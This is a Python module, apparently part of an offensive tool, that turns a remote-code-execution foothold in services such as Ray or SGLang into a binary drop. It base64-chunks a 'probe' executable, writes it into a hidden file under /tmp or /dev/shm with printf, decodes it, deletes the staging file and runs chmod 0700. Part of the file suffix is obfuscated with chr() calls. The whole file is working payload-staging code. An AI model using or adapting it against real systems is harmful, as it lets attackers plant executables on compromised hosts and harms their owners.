# -*- coding: utf-8 -*-
"""Common types for probe entry adapters."""

from __future__ import annotations

import base64
import hashlib
import shlex
from dataclasses import dataclass, field
from typing import Any, Callable, Protocol, Sequence


class EntryError(RuntimeError):
    pass


@dataclass
class ExecResult:
    exit_code: int = 0
    stdout: str = ""
    stderr: str = ""
    data: dict[str, Any] = field(default_factory=dict)

    @classmethod
    def from_value(cls, value: Any) -> "ExecResult":
        if isinstance(value, ExecResult):
            return value
        if isinstance(value, dict):
            return cls(
                exit_code=int(value.get("exit_code", 0 if value.get("ok", True) else 1)),
                stdout=str(value.get("stdout", "")),
                stderr=str(value.get("stderr", "")),
                data=dict(value),
            )
        return cls(exit_code=0, stdout=str(value))

    @property
    def ok(self) -> bool:
        return self.exit_code == 0


class CommandExecutor(Protocol):
    def run(self, command: str, timeout: float = 30.0) -> ExecResult:
        ...


class CallbackExecutor:
    """Adapter for an existing RCE primitive (Ray/AReaL/SGLang/module)."""

    def __init__(self, callback: Callable[[str, float], Any], *, name: str = "callback"):
        self.callback = callback
        self.name = name

    def run(self, command: str, timeout: float = 30.0) -> ExecResult:
        return ExecResult.from_value(self.callback(command, timeout))


@dataclass
class UploadPlan:
    remote_path: str
    sha256: str
    size: int
    chunks: int
    commands: list[str]

    def to_dict(self) -> dict[str, Any]:
        return {
            "remote_path": self.remote_path,
            "sha256": self.sha256,
            "size": self.size,
            "chunks": self.chunks,
            "commands": list(self.commands),
        }


def default_probe_path(probe_bytes: bytes, *, directory: str = "/tmp") -> str:
    digest = hashlib.sha256(probe_bytes).hexdigest()[:12]
    return f"{directory}/.inkblade-probe-{digest}"


def build_upload_plan(
    probe_bytes: bytes,
    *,
    remote_path: str | None = None,
    chunk_size: int = 512,
    decoder: str = "auto",
) -> UploadPlan:
    """Base64-chunk upload + chmod, without kubectl or an interpreter in the pod."""
    if not probe_bytes:
        raise EntryError("probe binary is empty")
    path = remote_path or default_probe_path(probe_bytes)
    if not (path.startswith("/tmp/") or path.startswith("/dev/shm/") or path.startswith("/var/tmp/")):
        raise EntryError("probe upload path must be under /tmp, /var/tmp or /dev/shm")
    encoded = base64.b64encode(probe_bytes).decode("ascii")
    chunks = [encoded[index:index + chunk_size] for index in range(0, len(encoded), chunk_size)]
    if not chunks:
        chunks = [""]
    commands: list[str] = []
    for index, chunk in enumerate(chunks):
        operator = ">" if index == 0 else ">>"
        commands.append(
            f"sh -c {shlex.quote(f'umask 077; printf %s {shlex.quote(chunk)} {operator} {shlex.quote(path + chr(46) + chr(98) + chr(54) + chr(52))}')}"
        )
    b64_path = path + ".b64"
    if decoder == "auto":
        decode = (
            f"if command -v base64 >/dev/null 2>&1; then base64 -d {shlex.quote(b64_path)} > {shlex.quote(path)}; "
            f"elif command -v openssl >/dev/null 2>&1; then openssl base64 -d -A -in {shlex.quote(b64_path)} -out {shlex.quote(path)}; "
            f"else echo 'no base64 decoder in target' >&2; exit 127; fi"
        )
    elif decoder == "base64":
        decode = f"base64 -d {shlex.quote(b64_path)} > {shlex.quote(path)}"
    elif decoder == "openssl":
        decode = f"openssl base64 -d -A -in {shlex.quote(b64_path)} -out {shlex.quote(path)}"
    else:
        raise EntryError(f"unknown decoder {decoder!r}")
    commands.append(f"sh -c {shlex.quote(decode)}")
    commands.append(f"sh -c {shlex.quote(f'rm -f {shlex.quote(b64_path)}; chmod 0700 {shlex.quote(path)}')}")
    return UploadPlan(
        remote_path=path,
        sha256=hashlib.sha256(probe_bytes).hexdigest(),
        size=len(probe_bytes),
        chunks=len(chunks),
        commands=commands,
    )


def deploy_probe(
    executor: CommandExecutor,
    probe_bytes: bytes,
    *,
    remote_path: str | None = None,
    dry_run: bool = False,
    timeout: float = 30.0,
    decoder: str = "auto",
) -> dict[str, Any]:
    plan = build_upload_plan(probe_bytes, remote_path=remote_path, decoder=decoder)
    result: dict[str, Any] = {
        "remote_path": plan.remote_path,
        "sha256": plan.sha256,
        "size": plan.size,
        "chunks": plan.chunks,
        "dry_run": dry_run,
        "executed": 0,
        "commands": list(plan.commands) if dry_run else [],
    }
    if dry_run:
        return result
    for command in plan.commands:
        executed = executor.run(command, timeout=timeout)
        result["executed"] += 1
        if not executed.ok:
            raise EntryError(
                f"probe upload command failed ({executed.exit_code}): "
                f"{executed.stderr or executed.stdout or command}"
            )
    return result


def shell_command(argv: Sequence[str]) -> str:
    return " ".join(shlex.quote(str(item)) for item in argv)
